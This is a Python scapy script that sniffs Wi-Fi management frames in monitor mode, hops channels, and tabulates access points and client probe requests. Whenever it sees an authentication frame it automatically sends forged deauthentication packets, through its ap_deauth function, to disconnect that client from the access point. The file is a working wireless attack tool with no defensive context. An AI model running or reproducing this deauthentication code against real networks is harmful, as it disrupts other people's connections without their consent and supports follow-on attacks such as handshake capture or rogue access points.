from scapy.all import *
from threading import Thread
import pandas
import time
import os
from itertools import cycle
from colorama import init, Fore, Back, Style

def callback(packet):
    if packet.haslayer(Dot11):
        #if packet.type == 0 and packet.subtype in (0, 2, 4):
            #print(f"Packet: {packet.summary()}")
            freq = packet[RadioTap].ChannelFrequency
            if freq is not None:
                channel = list(filter(lambda x: x[1]['freq'] == freq, channels.items()))[0][0]
            else:
                channel = 0
            signal = packet[RadioTap].dBm_AntSignal
            client_addr = packet.addr2
            payload_name = packet.payload.name

            # Capture management frames used from clients
            #  -> AssociationRequest, ReassociationRequest, ProbeRequest

            if packet.haslayer(Dot11Auth):
                client_addr = packet.addr1
                bssid_addr = packet.addr2
                print(f"{Fore.YELLOW}[Authentication] bssid: {bssid_addr}, cli: {client_addr}")

                Thread(target=ap_deauth, args=[scan_iface, bssid_addr, client_addr, 2]).start()

            if packet.haslayer(Dot11AssoReq):
                client_addr = packet.addr2
                print(f"{Fore.BLUE}[Association Request] cli: {client_addr}, freq: {freq} ({channel}), signal: {signal}")

            if packet.haslayer(Dot11ReassoReq):
                client_addr = packet.addr2
                print(f"{Fore.BLUE}[Reassociation Request] cli: {client_addr}, freq: {freq} ({channel}), signal: {signal}")

            if packet.haslayer(Dot11ProbeReq):
                client_addr = packet.addr2
                probe_req_ssid = packet[Dot11ProbeReq].info.decode()
                print(f"{Style.DIM}[Probe Request] cli: {client_addr}, ssid: {probe_req_ssid}, freq: {freq} ({channel}), signal: {signal}")

            if packet.haslayer(Dot11ProbeResp):
                bssid_addr = packet.addr2
                client_addr = packet.addr1
                probe_res_ssid = packet[Dot11ProbeResp].info.decode()
                print(f"{Style.DIM}[Probe Response] bssid: {bssid_addr}, cli: {client_addr}, ssid: {probe_res_ssid}, freq: {freq} ({channel}), signal: {signal}")

            if packet.haslayer(Dot11Beacon):
                # extract the MAC address of the network
                bssid = packet[Dot11].addr2
                # get the name of it
                if set(map(ord, list(packet[Dot11Elt].info.decode()))) == {0}:
                    ssid = "N/A"
                else:
                    ssid = packet[Dot11Elt].info.decode()
                try:
                    dbm_signal = packet.dBm_AntSignal
                except:
                    dbm_signal = "N/A"
                # extract network stats
                stats = packet[Dot11Beacon].network_stats()
                # get the channel of the AP
                channel = stats.get("channel")
                # get the crypto
                crypto = stats.get("crypto")
                if ssid is not None:
                    if bssid not in networks.index:
                        print(f"{Fore.RED}[Beacon] New AP bssid: {bssid}, ssid: {ssid}, channel: {channel}, signal: {dbm_signal}, crypto: {crypto}")
                    networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)

def ap_deauth(iface, ap_mac, client_mac, count):
    packet = RadioTap() / \
             Dot11(type=0,       # Management type
               subtype=12,       # Deauthentication subtype
               addr1=client_mac,
               addr2=ap_mac,
               addr3=ap_mac) / \
             Dot11Deauth(reason=7)

    for c in range(count):
        print(f"{Fore.GREEN}[Deauth] Sending to cli: {client_mac}, bssid: {ap_mac}")
        send_res = sendp(packet, iface=iface, verbose=False)

def print_all(sleep=1):
    while True:
        os.system("clear")
        networks.sort_values(by=['Channel','SSID'])
        print(networks)
        print("")
        print(clients)
        time.sleep(sleep)

def change_channel(sleep=1, iface="wlan1", channels=range(1, 15)):
    for ch in cycle(channels):
        os.system(f"iwconfig {iface} channel {ch}")
        time.sleep(sleep)

def iface_set_monitor(iface="wlan1"):
        os.system(f"ifconfig {iface} down;sleep 1")
        #"iw", "reg", "set", "GY"
        #os.system(f"iw reg set BZ")
        #os.system(f"iwconfig {iface} txpower 30")
        os.system(f"iwconfig {iface} mode monitor")
        os.system(f"ifconfig {iface} up;sleep 3")

networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
networks.set_index("BSSID", inplace=True)

clients = pandas.DataFrame(columns=["MAC", "Probe_SSID"])
clients.set_index("MAC", inplace=True)

probes = pandas.DataFrame(columns=["BSSID", "Info"])
probes.set_index("BSSID", inplace=True)

channels = {
        1: { 'freq': 2412},
        2: { 'freq': 2417},
        3: { 'freq': 2422},
        4: { 'freq': 2427},
        5: { 'freq': 2432},
        6: { 'freq': 2437},
        7: { 'freq': 2442},
        8: { 'freq': 2447},
        9: { 'freq': 2452},
        10: { 'freq': 2457},
        11: { 'freq': 2462},
        12: { 'freq': 2467},
        13: { 'freq': 2472},
        14: { 'freq': 2484},
}

if __name__ == "__main__":
    # Init colorama
    init(autoreset=True)
    # Set scan vars
    scan_iface = "wlan1"
    scan_channels = [1]
    # Set monitor mode
    iface_set_monitor(scan_iface)
    # start the thread that prints all the networks
    printer = Thread(target=print_all)
    printer.daemon = True
    #printer.start()
    # start the thread that changes channels
    channel_changer = Thread(target=change_channel, kwargs={'iface': scan_iface, 'channels': scan_channels, 'sleep': 1})
    channel_changer.daemon = True
    channel_changer.start()
    # start sniffing
    sniff(prn=callback, iface=scan_iface)
